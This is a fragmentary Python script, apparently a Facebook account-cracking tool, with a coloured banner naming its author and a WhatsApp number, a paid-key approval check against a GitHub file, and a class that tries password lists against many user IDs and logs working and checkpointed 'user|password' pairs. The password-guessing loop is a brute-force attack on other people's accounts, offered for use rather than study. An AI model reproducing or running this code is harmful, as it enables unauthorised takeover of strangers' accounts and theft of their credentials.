...
░▓  ░▒▓███▀▒░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒ ░░▒░▒░▓  ░ ▒░   ░  ░
 ...
 ░   ░         ░           ░  ░ ░  ░  ░ ░         ░   
          ░                                           
             ...
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;91mAUTHOR   : ibrahim        \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : ibrahim       \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : ibrahim 💔       \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +8801307213545     \033[1;93m▇▇
...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://github.com/Ibrahim-ok404/Ibrahim-/blob/main/Approval').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
        ...
        os.system('am start https://wa.me/+8801307213545?text=' + tks)
        reg()
...
def reg2():
    ...
    input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
    time.sleep(3.5)
    tks = 'Dear%20resma-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY : resma HASAN SHUVO");time.sleep (0.03)
    print("             [*]. FACEBOOK   : resma HASAN");time.sleep (0.03)
    print("             [*]. GITHUB     : resma HASAN");time.sleep (0.03)   
...
class __bsn__:
        ...
        for pw in __chi__:
            ...
            if "access_token" in p:
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-resma] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r [resma] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
